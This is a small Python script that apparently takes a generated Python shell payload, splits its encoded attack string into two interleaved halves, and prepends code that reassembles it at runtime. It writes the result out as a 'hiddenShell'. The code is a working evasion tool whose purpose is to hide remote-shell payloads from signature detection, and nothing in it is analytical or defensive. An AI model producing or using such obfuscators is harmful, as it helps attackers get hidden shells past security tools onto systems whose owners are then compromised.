#!/usr/bin/env python3

def grabEncoded(payload):
    import re
    regex = re.compile("sys\.version_info\[0\]\]\((\'.+\')\)")
    finder = re.search(regex, payload)
    encodedAttack = finder.group(1)
    payload = payload.replace(encodedAttack, "encodedAttack")
    return (encodedAttack, payload)

def getPayloadFromSTDIN():
    import sys
    return sys.stdin.read()

def getPayloadFromFile(fileName):
    with open(fileName, 'r') as file:
        payload = file.read()
    return payload

def breakEncoded(encodedAttack):
    encoded1 = encodedAttack[::2]
    encoded2 = encodedAttack[1::2]
    return (encoded1, encoded2)

def makePrepend(encoded1, encoded2):
    return (
        "encodedAttack=''.join([''.join(item) for item in zip('%s','%s')]);"
        % (encoded1, encoded2)
    )

def checkForInputFile():
    import sys
    args = sys.argv
    if len(args) > 2:
        raise RuntimeError("Only valid argument is a filename")
    return args[1] if len(args) == 2 else False

if fileName := checkForInputFile():
    payload = getPayloadFromFile(fileName)
else:
    payload = getPayloadFromSTDIN()
if not payload:
    raise RuntimeError("No payload was given")
encodedAttack, payload = grabEncoded(payload)
encodedAttack = encodedAttack.strip("'")
encoded1, encoded2 = breakEncoded(encodedAttack)
prepend = makePrepend(encoded1, encoded2)
hiddenShell = prepend + payload

import sys
sys.stdout.write(hiddenShell)